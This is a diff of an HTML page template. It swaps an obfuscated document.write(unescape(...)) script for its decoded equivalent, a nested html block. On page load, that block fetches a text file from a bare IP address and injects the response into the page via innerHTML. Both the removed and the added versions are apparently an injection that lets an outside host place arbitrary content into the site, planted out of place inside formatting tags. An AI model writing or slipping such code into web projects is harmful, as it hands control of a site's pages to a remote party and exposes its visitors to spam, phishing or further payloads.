@@ -52,11 +52,28 @@
 <!--<div class="moban_main">-->
 
 <big><big><big><b>
-<script>
-<!--
-document.write(unescape("%3Chtml%20lang%3D%22en%22%3E%20%20%0A%3Chead%3E%20%20%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%20%20%0A%20%20%20%20%3Cscript%3E%20%20%0A%20%20%20%20%20%20%20%20function%20loadFileContent%28%29%20%7B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20xhr.onreadystatechange%20%3D%20function%28%29%20%7B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28xhr.readyState%20%3D%3D%204%20%26%26%20xhr.status%20%3D%3D%20200%29%20%7B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20%u4F7F%u7528replace%u65B9%u6CD5%u5C06%u6362%u884C%u7B26%u66FF%u6362%u4E3A%3Cbr%3E%u6807%u7B7E%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20var%20contentWithBreaks%20%3D%20xhr.responseText.replace%28/%5Cn/g%2C%20%27%3Cbr%3E%27%29%3B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27content%27%29.innerHTML%20%3D%20contentWithBreaks%3B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20xhr.open%28%22GET%22%2C%20%22https%3A//39.101.206.113/8.txt%3F%22%20+%20Date.now%28%29%2C%20true%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20xhr.send%28%29%3B%20%20%0A%20%20%20%20%20%20%20%20%7D%20%20%0A%20%20%20%20%3C/script%3E%20%20%0A%3C/head%3E%20%20%0A%3Cbody%20onload%3D%22loadFileContent%28%29%22%3E%20%20%0A%20%20%20%20%3Cdiv%20id%3D%22content%22%20style%3D%22white-space%3A%20pre-line%3B%22%3E%3C/div%3E%0A%3C/body%3E%20%20%0A%3C/html%3E"));
-//-->
-</script>
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <script>  
+        function loadFileContent() {  
+            var xhr = new XMLHttpRequest();  
+            xhr.onreadystatechange = function() {  
+                if (xhr.readyState == 4 && xhr.status == 200) {  
+                    // 使用replace方法将换行符替换为<br>标签  
+                    var contentWithBreaks = xhr.responseText.replace(/\n/g, '<br>');  
+                    document.getElementById('content').innerHTML = contentWithBreaks;  
+                }  
+            };  
+            xhr.open("GET", "https://39.101.206.113/8.txt?" + Date.now(), true);
+            xhr.send();  
+        }  
+    </script>  
+</head>  
+<body onload="loadFileContent()">  
+    <div id="content" style="white-space: pre-line;"></div>
+</body>  
+</html>
 </b></big></big></big>
 
 
